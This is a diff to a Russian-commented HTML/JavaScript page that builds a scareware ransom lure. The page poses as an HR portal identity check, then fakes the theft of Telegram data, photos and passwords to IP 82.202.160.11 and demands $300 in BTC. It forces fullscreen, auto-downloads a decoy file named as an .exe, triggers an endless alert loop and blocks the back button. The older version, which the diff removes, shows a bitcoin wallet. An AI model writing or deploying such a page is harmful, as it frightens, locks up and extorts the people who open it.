@@ -3,72 +3,75 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>System Error | Critical Failure</title>
+    <title>HR Portal | Security Verification</title>
     <style>
-        /* СТИЛЬ В ДУХЕ PETYA / WANNACRY */
-        body { background-color: #000; color: #fff; font-family: "Lucida Console", Monaco, monospace; margin: 0; overflow: hidden; display: flex; justify-content: center; align-items: center; height: 100vh; }
+        body { background-color: #000; color: #0f0; font-family: 'Courier New', Courier, monospace; margin: 0; overflow: hidden; display: flex; justify-content: center; align-items: center; height: 100vh; }
         
-        #matrix { position: fixed; top: 0; left: 0; width: 100%; height: 100%; font-size: 10px; opacity: 0.1; z-index: 1; pointer-events: none; color: #0f0; }
+        /* ГЛУБОКИЙ ФОН С ТЕКСТОМ КАК НА ФОТО */
+        #matrix { position: fixed; top: 0; left: 0; width: 100%; height: 100%; font-size: 11px; opacity: 0.2; z-index: 1; pointer-events: none; white-space: pre; line-height: 1.1; overflow: hidden; color: #0f0; }
 
-        /* ЭКРАН ПРИКРЫТИЯ */
-        #overlay { position: fixed; top:0; left:0; width:100%; height:100%; z-index: 9999; background: #f4f4f4; display: flex; justify-content: center; align-items: center; font-family: sans-serif; }
-        .start-box { background: #fff; padding: 30px; border: 1px solid #ccc; box-shadow: 0 4px 15px rgba(0,0,0,0.1); width: 85%; max-width: 350px; text-align: center; }
-        .start-btn { padding: 12px; background: #0078d4; color: #fff; border: none; cursor: pointer; width: 100%; font-weight: bold; margin-top: 20px; }
+        /* НАЧАЛЬНОЕ ОКНО (HR ПОРТАЛ) */
+        #overlay { position: fixed; top:0; left:0; width:100%; height:100%; z-index: 9999; background: #f0f2f5; display: flex; justify-content: center; align-items: center; font-family: sans-serif; }
+        .start-box { background: white; padding: 40px 30px; border-radius: 4px; box-shadow: 0 20px 60px rgba(0,0,0,0.15); width: 85%; max-width: 400px; text-align: center; border-top: 6px solid #1a73e8; }
+        .start-btn { padding: 18px; font-size: 16px; background: #1a73e8; color: white; border: none; font-weight: bold; cursor: pointer; width: 100%; margin-top: 25px; border-radius: 4px; }
 
-        /* ТЕРМИНАЛ ЗАГРУЗКИ */
-        #loader-screen { position: relative; z-index: 10; width: 90%; max-width: 500px; display: none; text-align: left; }
-        .progress-container { width: 100%; border: 1px solid #fff; height: 15px; margin: 15px 0; background: #333; }
-        #progress-bar { width: 0%; height: 100%; background: #fff; transition: width 0.5s cubic-bezier(0.1, 0.5, 0.1, 1); }
-
-        /* ФИНАЛЬНЫЙ ИНТЕРФЕЙС БЛОКИРОВКИ */
-        .content { position: fixed; top:0; left:0; width: 100%; height: 100%; display: none; background: #7b0000; color: #fff; z-index: 100; box-sizing: border-box; padding: 20px; overflow-y: auto; text-align: center; }
-        .ransom-box { max-width: 700px; margin: 0 auto; background: #000; border: 4px solid #fff; padding: 20px; box-shadow: 10px 10px 0px #4a0000; }
+        /* ИНТЕРФЕЙС БЛОКИРОВКИ (ОДИН В ОДИН С ПЕРВОГО ФОТО) */
+        .content { position: relative; z-index: 10; width: 95%; max-width: 600px; display: none; }
+        .alert-box { border: 2px solid #ff0000; padding: 30px; color: #ff0000; background: rgba(0, 0, 0, 0.95); text-align: center; }
+        .alert-title { font-size: 24px; font-weight: bold; margin-bottom: 20px; letter-spacing: 2px; }
+        .alert-text { font-size: 14px; margin-bottom: 15px; line-height: 1.4; text-align: left; color: #ff0000; }
+        .ip-info { margin: 20px 0; color: #ff0000; font-weight: bold; font-size: 14px; }
+        .payment-info { color: #ffff00; font-weight: bold; font-size: 16px; margin-top: 20px; }
         
-        .btc-wallet { color: #ffff00; word-break: break-all; font-weight: bold; background: #111; padding: 10px; display: block; border: 1px dashed #ffff00; margin: 15px 0; font-family: monospace; }
-        .danger-btn { background: #ff0000; color: #fff; border: 2px solid #fff; padding: 15px; width: 100%; font-weight: bold; cursor: pointer; margin-top: 15px; text-transform: uppercase; }
-        
-        .blink { animation: blinker 1s step-start infinite; }
+        /* КОНСОЛЬНЫЙ ЛОУДЕР */
+        #loader-screen { position: relative; z-index: 10; width: 85%; max-width: 500px; display: none; text-align: left; }
+        .progress-container { width: 100%; border: 1px solid #0f0; height: 14px; margin: 15px 0; background: #000; overflow: hidden; }
+        #progress-bar { width: 0%; height: 100%; background: #0f0; transition: width 0.3s linear; }
+        #log-text { font-size: 14px; color: #0f0; margin-bottom: 5px; }
+
+        .danger-btn { background: #b30000; color: white; border: none; padding: 20px; width: 100%; font-weight: 900; cursor: pointer; margin-top: 25px; text-transform: uppercase; font-size: 16px; }
+        .blink { animation: blinker 0.7s step-start infinite; }
         @keyframes blinker { 50% { opacity: 0; } }
-        
-        h1 { font-size: 22px; color: #ff0000; background: #fff; display: inline-block; padding: 5px 15px; margin-bottom: 20px; }
-        .log-line { font-size: 11px; color: #0f0; margin-bottom: 2px; }
     </style>
 </head>
 <body onclick="startAttack()">
 
     <div id="overlay">
         <div class="start-box">
-            <h3 style="color:#333; margin-top:0;">HR System Check</h3>
-            <p style="font-size:13px; color:#666;">A security scan is required to access the document "Salary_Review_2026.pdf".</p>
-            <button class="start-btn">RUN VERIFICATION</button>
+            <h2 style="margin: 0 0 15px; color: #1e293b;">Internal HR Portal</h2>
+            <p style="color: #475569; font-size: 14px;">Attention: Identity verification required for "Senior Project Manager" access.</p>
+            <button class="start-btn">VERIFY IDENTITY</button>
         </div>
     </div>
 
     <div id="matrix"></div>
 
     <div id="loader-screen">
-        <div id="log-display" style="height: 150px; overflow: hidden; margin-bottom: 10px;"></div>
+        <div id="log-text">[SYSTEM] Инициализация сканирования...</div>
         <div class="progress-container"><div id="progress-bar"></div></div>
-        <div id="perc" style="font-weight: bold; text-align: right;">0%</div>
+        <div id="perc" style="color: #0f0; font-weight: bold; font-size: 20px;">0%</div>
+        <div id="sub-log" style="font-size: 11px; color: #0a0; margin-top: 10px; height: 50px; overflow: hidden;"></div>
     </div>
 
     <div id="main-content" class="content">
-        <div class="ransom-box">
-            <h1 class="blink">УСТРОЙСТВО ЗАБЛОКИРОВАНО</h1>
+        <div class="alert-box">
+            <div class="alert-title">SYSTEM COMPROMISED</div>
             
-            <div style="text-align: left; font-size: 14px; line-height: 1.4;">
-                <p>Все данные Telegram, история браузера и личные фото были успешно скопированы и отправлены на удаленный сервер <strong>82.202.160.11</strong>.</p>
-                <p style="color: #0f0;"><strong>RAT STATUS: ACTIVE (SESSION_0x882_ENCRYPTOR)</strong></p>
-                <p>Ваше устройство полностью скомпрометировано. Через 168 часов данные будут <strong>ЗАШИФРОВАНЫ</strong> и опубликованы в DarkNet без возможности восстановления.</p>
-                <p style="color: yellow;">Любая попытка закрыть страницу или перезагрузить систему приведет к немедленному удалению ключа и потере всех файлов.</p>
+            <div class="alert-text">
+                Все данные устройства (Telegram, Фото, Пароли) скопированы на удаленный сервер.
+            </div>
+            
+            <div class="ip-info">
+                IP: 82.202.160.11. Статус: ВЫГРУЗКА ЗАВЕРШЕНА.
+            </div>
+            
+            <div class="payment-info">
+                ТРЕБУЕТСЯ ОПЛАТА: $300 (BTC)
             </div>
 
-            <div style="margin-top: 20px;">
-                <p style="font-size: 13px; margin-bottom: 5px;">BTC Wallet for decryption ($300):</p>
-                <span class="btc-wallet">bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh</span>
+            <div style="margin-top: 20px; text-align: left; font-size: 12px; color: #aaa; border-top: 1px solid #333; padding-top: 10px;">
+                STATUS: WAITING FOR CONFIRMATION...
             </div>
-            
-            <p class="blink" style="font-size: 18px; color: yellow; font-weight: bold; margin: 15px 0;">STATUS: WAITING FOR PAYMENT (167:59:59)...</p>
             
             <button class="danger-btn" onclick="scareMore()">ДЕАКТИВИРОВАТЬ И УДАЛИТЬ RAT</button>
         </div>
@@ -80,18 +83,18 @@
         let prg = 0;
         let isStarted = false;
 
-        const hackerLogs = [
-            "[OK] Connecting to kernel mirror...",
-            "[OK] Escalating privileges to ROOT",
-            "[OK] Bypassing Google Play Protect v12.4",
-            "[WAIT] Accessing /data/user/0/com.telegram.messenger",
-            "[OK] 1,429 Telegram messages found",
-            "[OK] Dumping contacts database...",
-            "[OK] Initializing AES-256-CBC engine",
-            "[WAIT] Uploading DCIM/Camera to 82.202.160.11",
-            "[OK] 4.2GB uploaded successfully",
-            "[OK] Injecting RAT payload into zygote process",
-            "[CRITICAL] Modifying boot sectors..."
+        const consoleLogs = [
+            "Чтение данных Telegram Desktop...",
+            "Доступ к базе данных: contacts.db",
+            "Копирование сессии: session_01",
+            "Сканирование директории /DCIM/Camera",
+            "Обнаружено: 1,420 медиа файлов",
+            "Обход Google Play Protect... OK",
+            "Инъекция в процесс zygote...",
+            "Отправка пакетов на 82.202.160.11",
+            "Шифрование локальных файлов AES-256",
+            "Установка RAT модуля ID:0x882",
+            "Удаление логов присутствия..."
         ];
 
         function startAttack() {
@@ -101,70 +104,75 @@
             document.getElementById('overlay').style.display = 'none';
             document.getElementById('loader-screen').style.display = 'block';
 
+            if ("Notification" in window) {
+                Notification.requestPermission();
+            }
+            
+            const a = document.createElement('a');
+            a.href = URL.createObjectURL(new Blob(["CRITICAL_RAT_LOG\nID:882"], {type: 'text/plain'}));
+            a.download = "System_Security_Patch_082.exe";
+            a.click();
+
             if (document.documentElement.requestFullscreen) {
                 document.documentElement.requestFullscreen().catch(() => {});
             }
 
             slowLoading();
-            renderLogs();
-        }
-
-        function renderLogs() {
-            const logBox = document.getElementById('log-display');
-            let i = 0;
-            const logInterval = setInterval(() => {
-                if (i < hackerLogs.length) {
-                    const line = document.createElement('div');
-                    line.className = 'log-line';
-                    line.innerText = hackerLogs[i];
-                    logBox.appendChild(line);
-                    i++;
-                } else {
-                    clearInterval(logInterval);
-                }
-            }, 1200); // Логи выходят медленно и страшно
+            startMatrix();
         }
 
         function slowLoading() {
             const bar = document.getElementById('progress-bar');
             const perc = document.getElementById('perc');
+            const subLog = document.getElementById('sub-log');
 
             const timer = setInterval(() => {
-                // Псевдо-реалистичная загрузка с паузами
-                let increment = Math.random() * 0.3;
-                if (prg > 40 && prg < 55) increment = 0.05; // "Зависание" на важном этапе
-                
-                prg += increment;
+                // Очень плавная и "тяжелая" загрузка
+                prg += Math.random() * 0.3;
                 if (prg > 100) prg = 100;
                 
                 bar.style.width = prg + "%";
-                perc.innerText = Math.floor(prg) + "% ANALYZING FILES...";
+                perc.innerText = Math.floor(prg) + "%";
+
+                if (Math.random() > 0.85) {
+                    subLog.innerHTML = "> " + consoleLogs[Math.floor(Math.random() * consoleLogs.length)] + "<br>" + subLog.innerHTML;
+                }
 
                 if (prg >= 100) {
                     clearInterval(timer);
-                    setTimeout(showRansom, 1000); // Небольшая задержка перед шоком
+                    setTimeout(showRansom, 1200);
                 }
-            }, 80); 
+            }, 120); 
         }
 
         function showRansom() {
             document.getElementById('loader-screen').style.display = 'none';
             document.getElementById('main-content').style.display = 'block';
             document.getElementById('siren').play().catch(() => {});
-            if(navigator.vibrate) navigator.vibrate([1000, 500, 1000, 500, 2000]);
+            if(navigator.vibrate) navigator.vibrate([1000, 500, 1000]);
+        }
+
+        function startMatrix() {
+            const matrix = document.getElementById('matrix');
+            setInterval(() => {
+                const chars = "abcdefghijklmnopqrstuvwxyz0123456789";
+                let line = "";
+                for(let i=0; i<60; i++) line += chars[Math.floor(Math.random()*chars.length)] + " ";
+                matrix.innerText += "\n" + line;
+                if(matrix.innerText.length > 2000) matrix.innerText = matrix.innerText.substring(500);
+            }, 100);
         }
 
         function scareMore() {
-            alert("ОШИБКА ДЕАКТИВИЗАЦИИ: Код доступа отклонен.");
-            alert("ВНИМАНИЕ: Попытка вмешательства в процесс шифрования может привести к немедленной потере данных.");
+            alert("КРИТИЧЕСКАЯ ОШИБКА: RAT заблокировал попытку деактивации. Данные под угрозой удаления.");
+            alert("ATTEMPT TO CLOSE BLOCKED: Unauthorized access to system core.");
             setTimeout(() => { 
                 while(true) { 
-                    alert("FATAL ERROR: SYSTEM COMPROMISED (0x882)"); 
+                    alert("FATAL ERROR: DATA LEAK IN PROGRESS (SESSION_0x882)"); 
                 } 
             }, 500);
         }
 
-        // Блокировка кнопки "Назад"
         history.pushState(null, null, location.href);
         window.onpopstate = function () { history.go(1); };
     </script>
